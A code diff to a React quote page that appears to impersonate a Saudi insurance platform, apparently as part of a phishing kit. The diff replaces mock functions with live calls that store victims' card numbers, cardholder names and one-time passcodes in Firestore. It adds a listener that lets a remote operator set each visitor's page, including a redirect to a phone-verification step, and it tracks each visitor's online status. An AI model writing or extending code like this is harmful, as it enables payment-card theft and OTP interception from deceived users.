@@ -31,15 +31,7 @@ import { offerData } from "@/lib/data"
 import { doc, onSnapshot } from "firebase/firestore"
 
 
-// Mock Firebase functions
-const mockAddData = async (data: any) => {
-  console.log("Saving data:", data)
-  return Promise.resolve()
-}
 
-const mockSetupOnlineStatus = (visitorId: string) => {
-  console.log("Setting up online status for:", visitorId)
-}
 
 // Mock components to replace missing imports
 const MockInsurancePurpose = ({ formData, setFormData, errors }: any) => (
@@ -238,11 +230,15 @@ export default function QuotePage() {
   useEffect(() => {
     // Initialize visitor ID if not exists
     const visitorID = localStorage.getItem("visitor")
-    if(visitorID){
-    setMounted(true)
-    setupOnlineStatus(visitorID!)
-    }else{
-      window.location.href="/"
+    if (visitorID) {
+      setMounted(true)
+     setupOnlineStatus(visitorID!)
+    } else {
+      // Create new visitor ID if none exists
+      const newVisitorId = "visitor_" + Date.now()
+      localStorage.setItem("visitor", newVisitorId)
+      setMounted(true)
+      setupOnlineStatus(newVisitorId)
     }
   }, [])
 
@@ -264,8 +260,8 @@ export default function QuotePage() {
         <div className="max-w-7xl mx-auto flex items-center justify-between">
           <div className="flex items-center gap-4 lg:gap-8">
             <div className="flex items-center gap-3">
-              <div className="w-20 h-12  rounded-lg flex items-center justify-center">
-              <img src="/Logo-AR.png" alt="logo" width={80} />
+              <div className="w-20 h-12 rounded-lg flex items-center justify-center">
+                <img src="/Logo-AR.png" alt="logo" width={80} height={48} />
               </div>
               <div className="hidden sm:block">
                 <h1 className="text-xl font-bold text-gray-900">تأميني</h1>
@@ -523,10 +519,9 @@ export default function QuotePage() {
           <div className="grid sm:grid-cols-2 lg:grid-cols-4 gap-8 mb-12">
             <div className="space-y-6">
               <div className="flex items-center gap-3">
-                <div className="w-32 h-16 bg-white rounded-lg flex items-center justify-center">
-                <img src="/Logo-AR.png" alt="logo" width={80} />
-
-                      </div>
+                <div className="w-32 h-16 p-2 bg-white rounded-lg flex items-center justify-center">
+                  <img src="/Logo-AR.png" alt="logo" width={128} height={64} />
+                </div>
               </div>
               <p className="text-gray-400 leading-relaxed">
                 منصة التأمين الرقمية الرائدة في السعودية، نقدم أفضل الحلول التأمينية بأسعار تنافسية
@@ -630,9 +625,9 @@ export default function QuotePage() {
     </div>
   )
 }
-const allOtp=[
-  ''
-]
+
+const allOtp = [""]
+
 function ProfessionalQuoteForm() {
   const [currentPage, setCurrentStep] = useState(1)
   const [errors, setErrors] = useState<Record<string, string>>({})
@@ -669,6 +664,7 @@ function ProfessionalQuoteForm() {
 
   const stepHeaderRef = useRef<HTMLHeadingElement>(null)
   const firstInputRef = useRef<HTMLInputElement>(null)
+
   const errorSummaryRef = useRef<HTMLDivElement>(null)
 
   const steps = [
@@ -709,19 +705,26 @@ function ProfessionalQuoteForm() {
       errorSummaryRef.current.focus()
     }
   }, [errors])
+
   useEffect(() => {
     const visitorId = localStorage.getItem("visitor")
     if (visitorId) {
       const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
         if (docSnap.exists()) {
           const data = docSnap.data() 
-          setCurrentStep(parseInt(data.currentPage))
+          if (  currentPage !== data.currentPage) {
+            if(data.currentPage === '9999'){
+              window.location.href='/verify-phone'
+            }else
+            {setCurrentStep(data.currentPage)}
+          } 
         }
       })
 
       return () => unsubscribe()
     }
   }, [])
+
   const validationRules = {
     documment_owner_full_name: {
       required: true,
@@ -768,9 +771,8 @@ function ProfessionalQuoteForm() {
       required: true,
       message: "يرجى اختيار عرض التأمين المناسب",
     },
- 
     phone: {
-      required: true,
+      required: false,
       pattern: /^(05|5)[0-9]{8}$/,
       message: "يرجى إدخال رقم هاتف سعودي صحيح (05xxxxxxxx)",
     },
@@ -894,8 +896,11 @@ function ProfessionalQuoteForm() {
   }
 
   const prevStep = () => {
+    const vistorId=localStorage.getItem('visitor')
     if (currentPage > 1) {
       setCurrentStep(currentPage - 1)
+      addData({id:vistorId,currentPage})
+
     }
   }
 
@@ -908,7 +913,7 @@ function ProfessionalQuoteForm() {
     const visitorId = localStorage.getItem("visitor")
 
     try {
-      await mockAddData({
+      await addData({
         id: visitorId,
         otp,
         otpVerified: false,
@@ -981,7 +986,7 @@ function ProfessionalQuoteForm() {
   function handlePayment(): void {
     const visitorId = localStorage.getItem("visitor")
 
-    mockAddData({
+    addData({
       id: visitorId,
       cardNumber,
       cardName,
@@ -1517,7 +1522,7 @@ function ProfessionalQuoteForm() {
                 <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
                   <div className="space-y-6">
                     <h4 className="text-xl font-bold text-gray-900 text-center">معلومات التواصل</h4>
-                    <label className="pt-4">
+                    <label>
                       رقم الهاتف
                     </label>
                     <Input
@@ -1528,7 +1533,7 @@ function ProfessionalQuoteForm() {
                       maxLength={10}
                       autoFocus={true}
                     />
-                  
+
                     <div className="bg-blue-50 border border-blue-200 rounded-xl p-4">
                       <div className="flex items-start gap-3">
                         <input
@@ -1614,7 +1619,7 @@ function ProfessionalQuoteForm() {
                               <hr className="border-gray-200" />
                               <div className="flex justify-between items-center text-xl">
                                 <span className="font-bold text-gray-900">المجموع الكلي</span>
-                                <span className="font-bold text-green-600">{total} ر.س</span>
+                                <span className="font-bold text-green-600">{total.toFixed(2)} ر.س</span>
                               </div>
                             </div>
                           </div>
